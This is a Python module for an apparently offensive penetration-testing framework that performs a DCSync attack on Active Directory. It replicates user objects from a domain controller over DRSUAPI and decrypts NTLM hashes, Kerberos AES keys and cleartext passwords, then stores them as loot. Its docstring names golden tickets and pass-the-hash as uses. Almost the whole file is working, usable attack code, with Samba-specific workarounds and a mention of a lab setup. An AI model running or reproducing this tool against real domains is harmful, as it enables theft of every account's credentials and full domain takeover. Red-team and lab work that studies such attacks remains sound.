"""DCSync: replicate the directory over DRSUAPI, dump password hashes.

The attack: domain controllers replicate user objects — including the
unicodePwd (NT hash) attribute — to other DCs via MS-DRSR (DRSUAPI over
RPC). Any account holding the Replicating Directory Changes rights can
ask for the same data and the DC complies, because as far as it knows
it's talking to a peer DC. Domain Admins hold those rights by default.

Why it's the crown jewels: the krbtgt hash mints golden tickets, the
Administrator hash is pass-the-hash domain admin, and every other hash
feeds hashcat or PTH. Output lines are hashcat-format NTLM
(user:RID:LM:NT:::) and land in loot type 'hash' like kerberoast's.

COMPAT NOTE (hard-won, like kerberoast's checksum): impacket's stock
per-object replication (NTDSHashes) builds its partial attribute set
with MakeAttid, which emits table-RELATIVE attids plus a 1-entry client
prefix map. Windows accepts that. Samba (>= 4.x) verifies a non-empty
client prefix map with schema-info semantics, rejects a 1-entry map
outright (WERR_INVALID_PARAMETER on the wire), and returns an empty
reply. So this module vendors its own GetNCChanges request: attids in
the STANDARD prefix encoding (index 0x0009 = 1.2.840.113556.1.4) and an
EMPTY prefix table, which takes Samba's documented "Windows RODC"
fallback (local prefix map) — and remains perfectly valid for real
Windows DCs, since that's exactly what Windows RODCs send.

Transport note: DRSUAPI speaks ncacn_ip_tcp only — the client resolves
the endpoint via the mapper on 135 and then talks a dynamic RPC port.
The AD lab pins Samba's dynamic range (49152-49160) and publishes it
1:1; a DC that blocks those ports can't be synced.
"""

from struct import pack

from core.module import AuxiliaryModule
from core.options import OptAddress, OptString

try:
    from impacket.dcerpc.v5 import drsuapi
    from impacket.dcerpc.v5.dtypes import NULL, SID
    from impacket.examples.secretsdump import NTDSHashes, RemoteOperations
    from impacket.nt_errors import STATUS_MORE_ENTRIES
    from impacket.smbconnection import SMBConnection
except ImportError:
    drsuapi = NULL = SID = NTDSHashes = RemoteOperations = None
    STATUS_MORE_ENTRIES = SMBConnection = None

# index of 1.2.840.113556.1.4 in the DRS standard prefix map
STD_PREFIX_INDEX = 0x0009


def attid_for_oid(oid):
    """ATTRTYP value for a 1.2.840.113556.1.4.* OID in the standard
    prefix encoding — no client prefix table needed, which is what
    Samba's strict mapping_ctr verification demands (see module doc)."""
    last = int(oid.split(".")[-1])
    lower = last % 16384
    if last >= 16384:
        lower += 32768  # marker: suffix is not the whole lastValue
    return (STD_PREFIX_INDEX << 16) + lower


def parse_secret(line):
    """'forge.local\\Administrator:500:aad3b...:31d6c...:::' ->
    (user, rid, lm_hash, nt_hash). Returns None for non-conforming lines
    (status lines, kerberos-key output, etc. — callers skip those)."""
    parts = line.strip().split(":")
    if len(parts) < 4 or not parts[1].isdigit():
        return None
    user = parts[0].split("\\")[-1]
    return user, parts[1], parts[2], parts[3]


def sid_to_dsname(sid_string):
    """DSNAME identifying an object by SID (the request shape of
    impacket's DRSGetNCChangesSid)."""
    tsid = SID()
    tsid.fromCanonical(sid_string)
    packet = pack("<B", tsid.fields["Revision"])
    packet += pack("<B", tsid.fields["SubAuthorityCount"])
    packet += tsid.fields["IdentifierAuthority"].fields["Value"]
    packet += tsid.fields["SubAuthority"]
    ds = drsuapi.DSNAME()
    ds["SidLen"] = len(packet)
    ds["Guid"] = drsuapi.NULLGUID
    ds["Sid"] = packet
    ds["NameLen"] = 0
    ds["StringName"] = "\x00"
    ds["structLen"] = len(ds.getData())
    return ds


def secret_attr_set():
    """PARTIAL_ATTR_VECTOR_V1_EXT for the secret-bearing attributes
    (impacket's list), attids in the standard encoding."""
    pas = drsuapi.PARTIAL_ATTR_VECTOR_V1_EXT()
    pas["dwVersion"] = 1
    oids = list(NTDSHashes.ATTRTYP_TO_ATTID.values())
    pas["cAttrs"] = len(oids)
    for oid in oids:
        attr = drsuapi.ATTRTYP()
        attr["Data"] = attid_for_oid(oid)
        pas["rgPartialAttr"].append(attr)
    return pas


class _NoResume:
    """Stand-in for impacket's resume-session machinery: a full sync
    otherwise drops a sessionresume_XXXXXXXX file in the CWD on every run.
    Lab runs are short; litter is forever."""
    def __init__(self, _):
        pass

    def hasResumeData(self):
        return False

    def beginTransaction(self):
        pass

    def endTransaction(self):
        pass

    def clearResumeData(self):
        pass

    def writeResumeData(self, data):
        pass


class DcSync(AuxiliaryModule):
    name = "DCSync (DRSUAPI replication)"
    description = """
        Replicates the domain's user objects from a DC via DRSUAPI and
        dumps NTLM password hashes (hashcat format, loot type 'hash').
        Needs an account with Replicating Directory Changes rights —
        Administrator works. TARGET limits the sync to one account
        (e.g. krbtgt for golden tickets); blank syncs everything.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Domain controller"))
        self.options.add(OptString("DOMAIN", required=True,
                                   description="Domain, e.g. forge.local"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Account with replication rights "
                                               "(e.g. Administrator)"))
        self.options.add(OptString("PASSWORD", required=True, description="Password"))
        self.options.add(OptString("TARGET", default="",
                                   description="Single account to sync "
                                               "(blank = the whole directory)"))

    def run(self):
        domain = str(self.get_option("DOMAIN"))
        user = str(self.get_option("USERNAME"))
        password = str(self.get_option("PASSWORD"))
        target = str(self.get_option("TARGET") or "").strip().lower() or None
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._sync(host, domain, user, password, target)

    def _sync(self, host, domain, user, password, target):
        store = getattr(self.framework, "store", None)
        self._host = host
        self._store = store
        self._count = 0
        try:
            conn = SMBConnection(host, host, sess_port=445, timeout=30)
            conn.login(user, password, domain)
        except Exception as e:
            self.print_error(f"{host}: SMB login as {user} failed - {e}")
            return
        self.print_status(f"{host}: authenticated as {user}, requesting replication")
        self.print_debug(f"{host}: target={target or '<all>'} (DRSUAPI via "
                         "endpoint mapper 135 + dynamic RPC)")
        try:
            ops = RemoteOperations(conn, doKerberos=False)
            # bind DRSUAPI + DRSBind now (getDrsr() alone returns None);
            # the private handle/guid feed the vendored request below
            ops._RemoteOperations__connectDrds()
            ops.getDomainUsers(0)  # warms SAMR + resolves the domain SID
            ntds = NTDSHashes(None, None, isRemote=True, remoteOps=ops,
                              noLMHash=True, perSecretCallback=self._on_secret,
                              resumeSessionMgr=_NoResume)
            self._replicate(ops, ntds, target)
        except Exception as e:
            self.print_error(f"{host}: replication failed - {e}")
            return
        finally:
            try:
                conn.close()
            except Exception:
                pass
        if self._count == 0:
            self.print_error(f"{host}: 0 hashes — replication rights missing?")
        else:
            self.print_good(f"{host}: {self._count} hash(es) replicated")
        if store is not None:
            store.add_cred(host, "smb", user, password, source="dcsync")

    def _replicate(self, ops, ntds, target):
        """Per-user EXOP_REPL_OBJ over SAMR-enumerated accounts."""
        domain_sid = ops.getDomainSid()
        enum_ctx = 0
        status = STATUS_MORE_ENTRIES
        seen = 0
        while status == STATUS_MORE_ENTRIES:
            resp = ops.getDomainUsers(enum_ctx)
            for entry in resp["Buffer"]["Buffer"]:
                name = entry["Name"]
                if target and name.lower() != target:
                    continue
                seen += 1
                self._sync_user(ops, ntds, f"{domain_sid}-{entry['RelativeId']}", name)
            enum_ctx = resp["EnumerationContext"]
            status = resp["ErrorCode"]
        if target and seen == 0:
            self.print_error(f"{self._host}: no such account: {target}")

    def _sync_user(self, ops, ntds, sid, name):
        drsr = ops.getDrsr()
        req = drsuapi.DRSGetNCChanges()
        req["hDrs"] = ops._RemoteOperations__hDrs
        req["dwInVersion"] = 8
        req["pmsgIn"]["tag"] = 8
        msg = req["pmsgIn"]["V8"]
        guid = ops._RemoteOperations__NtdsDsaObjectGuid
        msg["uuidDsaObjDest"] = guid
        msg["uuidInvocIdSrc"] = guid
        msg["pNC"] = sid_to_dsname(sid)
        msg["usnvecFrom"]["usnHighObjUpdate"] = 0
        msg["usnvecFrom"]["usnHighPropUpdate"] = 0
        msg["pUpToDateVecDest"] = NULL
        msg["ulFlags"] = drsuapi.DRS_INIT_SYNC | drsuapi.DRS_WRIT_REP
        msg["cMaxObjects"] = 1
        msg["cMaxBytes"] = 0
        msg["ulExtendedOp"] = drsuapi.EXOP_REPL_OBJ
        msg["pPartialAttrSet"] = secret_attr_set()
        msg["PrefixTableDest"]["PrefixCount"] = 0  # see module docstring
        msg["pPartialAttrSetEx1"] = NULL
        try:
            # checkError=False: impacket's trailing-4-bytes error heuristic
            # misfires on Samba replies; extended_ret tells the truth
            resp = drsr.request(req, checkError=False)
        except Exception as e:
            self.print_debug(f"{name}: GetNCChanges raised: {e}")
            return
        out = resp["pmsgOut"]["V%d" % resp["pdwOutVersion"]]
        if out["cNumObjects"] == 0:
            self.print_debug(f"{name}: 0 objects (extended_ret={out['ulExtendedRet']})")
            return
        try:
            ntds._NTDSHashes__decryptHash(resp, out["PrefixTableSrc"]["pPrefixEntry"],
                                          None)
            # supplemental credentials: Kerberos AES keys + cleartext
            # passwords — the golden_ticket module needs the AES half.
            # dump() normally emits these at the end; we drain per user.
            ntds._NTDSHashes__decryptSupplementalInfo(
                resp, out["PrefixTableSrc"]["pPrefixEntry"], None, None)
            kerberos = getattr(ntds, "_NTDSHashes__kerberosKeys", {})
            for item_key in list(kerberos):
                self._on_secret(None, item_key)
            kerberos.clear()
            cleartext = getattr(ntds, "_NTDSHashes__clearTextPwds", {})
            for item_key in list(cleartext):
                self._on_secret(None, item_key)
            cleartext.clear()
        except Exception as e:
            self.print_debug(f"{name}: decrypt failed: {e}")

    def _on_secret(self, secret_type, secret):
        parsed = parse_secret(secret)
        if parsed is None:
            self._on_supplemental(secret)
            return
        user, rid, _, _ = parsed
        self._count += 1
        self.print_good(f"{user} (RID {rid}): {secret.split(':', 3)[3][:60]}")
        self.print_debug(f"full line: {secret}")
        if self._store is not None:
            self._store.add_loot("hash", f"ntds {user} @ {self._host}",
                                 secret, address=self._host)

    def _on_supplemental(self, secret):
        """Kerberos AES keys ('user:aes256-cts-hmac-sha1-96:hex') and
        CLEARTEXT passwords — looted separately from the NT hashes."""
        if ":aes" in secret:
            user, key_type, key_hex = secret.split(":", 2)
            self.print_good(f"{user}: {key_type} {key_hex[:40]}...")
            if self._store is not None:
                self._store.add_loot("kerberos-key",
                                     f"{key_type} {user} @ {self._host}",
                                     secret, address=self._host)
        elif ":CLEARTEXT:" in secret:
            user, _, password = secret.split(":", 2)
            self.print_good(f"{user}: CLEARTEXT password recovered")
            if self._store is not None:
                self._store.add_loot("cleartext", f"{user} @ {self._host}",
                                     secret, address=self._host)
        else:
            self.print_debug(f"{self._host}: skipped non-hash output: {secret}")
